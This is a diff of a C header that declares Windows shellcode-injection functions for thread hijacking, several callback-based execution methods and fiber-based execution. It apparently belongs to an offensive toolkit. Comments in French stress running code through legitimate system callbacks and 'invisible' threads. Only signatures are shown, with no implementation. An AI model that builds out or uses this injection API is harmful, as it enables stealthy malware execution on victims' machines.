@@ -44,14 +44,14 @@ BOOL Injection_ThreadHijackWithRestore(DWORD targetPid, DWORD targetTid,
                                         BYTE* shellcode, DWORD shellcodeSize);
 BOOL Injection_ListThreads(DWORD targetPid, char** outJson);
 
-/* Callback-based Execution */
+/* Callback-based Execution - exécute via callbacks système légitimes */
 BOOL Injection_ThreadPoolCallback(BYTE* shellcode, DWORD shellcodeSize);
 BOOL Injection_TimerCallback(BYTE* shellcode, DWORD shellcodeSize, DWORD delayMs);
 BOOL Injection_EnumWindowsCallback(BYTE* shellcode, DWORD shellcodeSize);
 BOOL Injection_CertEnumCallback(BYTE* shellcode, DWORD shellcodeSize);
 BOOL Injection_CopyFileCallback(BYTE* shellcode, DWORD shellcodeSize);
 
-/* Fiber-based Injection */
+/* Fiber-based Injection - threads user-mode invisibles */
 BOOL Injection_FiberLocal(BYTE* shellcode, DWORD shellcodeSize);
 BOOL Injection_FiberSafe(BYTE* shellcode, DWORD shellcodeSize);
 
